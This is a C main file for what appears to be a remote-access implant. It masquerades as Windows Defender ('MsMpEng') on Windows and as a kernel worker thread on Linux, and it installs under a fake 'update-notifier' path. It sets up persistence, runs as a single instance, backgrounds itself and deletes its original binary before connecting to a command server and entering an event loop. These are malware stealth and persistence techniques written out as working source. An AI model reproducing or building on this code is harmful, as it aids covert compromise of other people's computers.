#ifdef __WIN32__
#include <shlobj.h>
#endif

#include "config.h"
#include "events/events.h"
#include "modules/sysinfo.h"

struct system_info g_sysinfo = {0};
char *g_current_path = NULL;

char *nix_process_name = "[kworker/u8:7-ev]";
char *server = "https://localhost";
char *nix_bin_path = "/usr/local/bin/update-notifier";

char *win_bin_name = "MsMpEng";

#ifdef __WIN32__
char win_bin_path[MAX_PATH];

int is_running() {
    char *mutex = "MsMpEng1";

    HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, mutex);

    if (hMutex) {
        return 1;
    }

    hMutex = CreateMutex(0, 0, mutex);

    return 0;
}

#endif

int main(int argc, char **argv) {
#ifdef __WIN32__
    if (is_running()) {
        return 0;
    }

    memset(win_bin_path, 0, MAX_PATH);

    if (!SUCCEEDED(SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, win_bin_path))) {
        return 2;
    }

    strcat(win_bin_path, "\\");
    strcat(win_bin_path, win_bin_name);
    strcat(win_bin_path, ".exe");

    //memcpy(win_bin_path + strlen(win_bin_path), win_bin_name, strlen(win_bin_name));
    //memcpy(win_bin_path + strlen(win_bin_path) + strlen(win_bin_name), ".exe", 4);

    Sleep(START_SLEEP * 1000);
#endif
    g_current_path = argv[0];
    get_system_info(&g_sysinfo);

    persistent_launch_agent(argv[0]);

#if defined(__linux__)
    into_background();
    set_process_name(nix_process_name);

    if(file_exists(g_current_path) && strcmp(nix_process_name, g_current_path)) {
        unlink(g_current_path);
    }

#endif

    if (!transport_init()) {
        return 1;
    }

    event_loop();

    transport_destroy();

    return 0;
}
